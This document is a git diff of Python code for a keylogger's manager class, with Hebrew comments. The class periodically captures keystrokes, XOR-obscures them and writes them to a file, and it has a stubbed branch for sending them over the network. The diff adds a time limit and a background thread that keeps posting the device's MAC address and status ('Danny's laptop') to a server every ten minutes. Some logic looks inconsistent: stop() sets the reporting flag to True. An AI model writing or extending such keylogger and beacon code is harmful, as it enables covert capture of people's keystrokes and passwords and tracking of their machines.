@@ -1,24 +1,27 @@
-import time, datetime, ctypes, threading
+import time
+import datetime
+import threading
+import uuid
 from key_logger import KeyLogger
 from FileWriter import FileWriter
 from encryption import Encryption
-import requests
-import uuid
 from api_server import RequestManager
 
 
 class Manager:
 
-    def __init__(self, time_to_run=0, wright_to="json", time_wright=60):
+    def __init__(self, timeLimit=0, storageLocation="json", time_wright=60):
         self.time_wright = time_wright
         self.keylogger = KeyLogger()
         self.file_writer = FileWriter()
         self.encryption = Encryption(5)
         self.running = False
-        self.wright_to = wright_to
-        self.time_to_run = time_to_run
+        self.storageLocation = storageLocation
+        self.timeLimit = timeLimit
+        self.keep_reporting = True  # דגל שימשיך לדווח גם לאחר שהפסיק את הקילוג
 
     def collect_keys(self):
+        start_time = time.time()
         while self.running:
             try:
                 time.sleep(self.time_wright)
@@ -26,20 +29,22 @@ class Manager:
                 if logged_keys:
                     timestamp = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
                     data = {timestamp: logged_keys}
-                    # הצפנה
-                    encrypted_data = self.encryption.xor_encrypt_decrypt_dict_list(data)
+                    encrypted_data = self.encryption.xor_encrypt_decrypt_dict_list(self.storageLocation, data)
                     print(encrypted_data)
 
-                    # שליחה לקובץ
-                    if self.wright_to == "json":
+                    if self.storageLocation == "json":
                         self.file_writer.Writes_to_file(encrypted_data)
 
-                    #  שליחה לרשת (אם מופעל)
-                    elif self.wright_to == "network":
-                        pass  # self.network_writer.send(encrypted_data)
+                    elif self.storageLocation == "network":
+                        pass  # שליחה לרשת (לא מוגדר כרגע)
 
-                    #  ניקוי ה-buffer
-                    self.keylogger.clear_buffer()  # שים לב שזה כנראה צריך להיות בתוך KeyLogger
+                    self.keylogger.clear_buffer()
+
+                # אם יש מגבלת זמן והזמן עבר, הפסיק את ההקלטה
+                if self.timeLimit > 0 and time.time() - start_time >= self.timeLimit:
+                    self.stop()
+                    threading.Thread(target=self.report_status_loop, daemon=True).start()  # הפעל דיווח קבוע
+
             except Exception as e:
                 print(f"Error collecting keystrokes: {e}")
 
@@ -49,11 +54,16 @@ class Manager:
             "macAddress": mac_address,
             "name": "מחשב נייד של דני",
             "connected": connected,
-            "timeLimit": 180,
-            "storageLocation": self.wright_to,
-            "lastSeen": "2024-02-23 10:30"
+            "timeLimit": self.timeLimit,
+            "storageLocation": self.storageLocation,
+            "lastSeen": datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
         }
         RequestManager().handle_request('POST', "status", status)
+
+    def report_status_loop(self):
+        while self.keep_reporting:
+            self.server_status_update("false")  # עדכן שההקלטה נעצרה
+            time.sleep(600)  # המתן 10 דקות לפני הדיווח הבא
 
     def start(self):
         self.running = True
@@ -65,8 +75,9 @@ class Manager:
     def stop(self):
         self.running = False
         self.keylogger.stop_logging()
+        self.keep_reporting = True  # המשך לדווח לשרת
 
 
 if __name__ == '__main__':
-    a = Manager(time_wright=30)
+    a = Manager(timeLimit=180, time_wright=30)  # דוגמה להפעלה עם מגבלת זמן
     a.start()
